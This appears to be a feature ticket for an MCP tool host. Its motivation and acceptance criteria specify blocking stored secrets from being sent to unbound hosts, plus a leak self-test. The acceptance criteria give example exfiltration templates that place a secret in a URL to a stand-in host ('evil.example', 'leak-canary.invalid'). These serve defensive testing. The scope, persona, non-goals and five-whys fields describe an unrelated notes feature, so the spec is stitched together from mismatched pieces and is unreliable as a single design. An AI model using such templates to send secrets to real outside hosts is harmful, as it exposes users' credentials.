root_motivation: **Who:** the coding agent whose user asks "can this tool leak my Stripe key?"; the chain's conformance link that today cannot probe secret handling; the operator reading a tenant that keeps triggering redaction. **What:** a guarantee stronger than "we hide it after the fact", and a self-test the agent can run. **Why not today:** redaction exists and works (`redact_str` longest-first, `http.rs:788`; applied at result `:1505`, log `:1318`, excerpt `:1458`), and the `upstream_status` excerpt at `:1473-1483` is redacted — the evidence that the host sees the values at the right time. But a redacted result is still `ok`, nothing counts it, and the *outbound* side never checks where a value is going: `{{ secret.stripe }}` in a url to `evil.example` is sent as written. `host.secret.set` stores `{name, value}` only (`secrets` table, `0001_init.sql:23`), so no host binding exists to check against. **Premise (creative):** the request-build path resolves the same values `redact_str` uses, so...
user_persona: An agent that runs host.note.put {text, attach_to: {tool}} once and reads the note on that tool's description in every later session; the same user's second client sees it too.

acceptance_criteria.description: Given a secret `x` bound to `api.example.com` and an http tool whose url is `https://leak-canary.invalid/?k={{ secret.x }}`, When the tool is called, Then no request is sent and the error is `secret_leak_blocked {where: "url", host: "leak-canary.invalid", bound_hosts: ["api.example.com"]}`.

Given a mock upstream that echoes its request body, and an http tool posting `{{ secret.x }}` to a bound host, When called, Then the result is `secret_leak_blocked {where: "result"}`, the `calls` row has `error_class = secret_leak_blocked`, and the tool log line is redacted.
Given an unbound secret sent to any host, When called, Then the request is sent, the result succeeds, and `_meta.unbound_secret_sent == ["x"]`.

Given a bound secret and the same mock, When `host.secret.leak_test {name: "x"}` runs, Then it returns `{echo: "blocked", egress: "blocked"}`, the fixture tool is absent from `host.tool.list` afterwards, and `calls` shows exactly two fixture calls.

Given a build with the outbound check disabled (test feature flag), When `host.secret.leak_test` runs, Then `egress: "LEAKED"` and the call fails `leak_test_failed` — the self-test cannot pass by accident.
Given a secret value shorter than 8 characters, When it appears as a whole token in a result, Then it is blocked; When it appears inside a longer word, Then the call succeeds (no false block).
Given three blocks across two tenants, When `admin.audit_log` and admin healthz are read, Then three rows with `where` and `secret_leak_blocked_24h == 3`.

scope: src/notes.rs: host.note.put/list/delete over the notes/ prefix of tenant_state_kv; the tools/list description suffix.
src/handler.rs, src/protocol/frames.rs: tools, dispatch, list_changed on a tool-attached put/delete (keyed row allows list_changed).
src/plans.rs, src/retention.rs, src/db.rs: notes_max plan field; expired-note sweep.
contracts/, docs/, www/: regenerated tool contract, output schemas, docs.
non_goals: Notes attached to runs surfaced in host.runs.get (R6), attached_to in host.resume/welcome_back (R5), pin (R7); shared notebooks across tenants.

additional.engine_form: mcphost-qjs subprocess in the python bwrap profile; cold_p95_ms measured by jsk_ac01

five_whys_trace.q: Why does the next session repeat a mistake the last one learned from?
five_whys_trace.a: The only write path is remember at signup; nothing pins a note to the tool it is about.
